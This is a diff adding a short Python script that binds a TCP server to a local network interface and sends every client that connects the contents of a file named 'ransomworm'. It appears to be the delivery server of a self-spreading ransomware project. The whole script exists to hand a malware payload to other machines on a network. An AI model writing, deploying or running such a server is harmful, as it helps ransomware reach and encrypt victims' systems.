@@ -1,0 +1,30 @@
+#!/usr/bin/python3 
+import socket
+import netifaces as ni
+import sys
+import signal
+import time
+key = ['addr','netmask','broadcast']
+interfaces = ni.interfaces()
+for interface in interfaces:
+    addrs = ni.ifaddresses(interface)[2][0]
+    print(addrs)
+    cnt = 0
+    for j in key:
+        if(j in addrs.keys()):
+            cnt+=1
+            print(addrs[j])
+    if(cnt != 3):
+        print("this interface: lo isn't feasible")
+    else:
+        print(addrs['addr'],sys.argv[1])
+        server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        server_address = (addrs['addr'],int(sys.argv[1]))
+        server.bind(server_address)
+        server.listen(1)
+        print("Server listening....")
+        while(True):    
+            client,addr = server.accept()
+            with open('ransomworm','rb') as f:
+                client.sendall(f.read())
+            client.close()
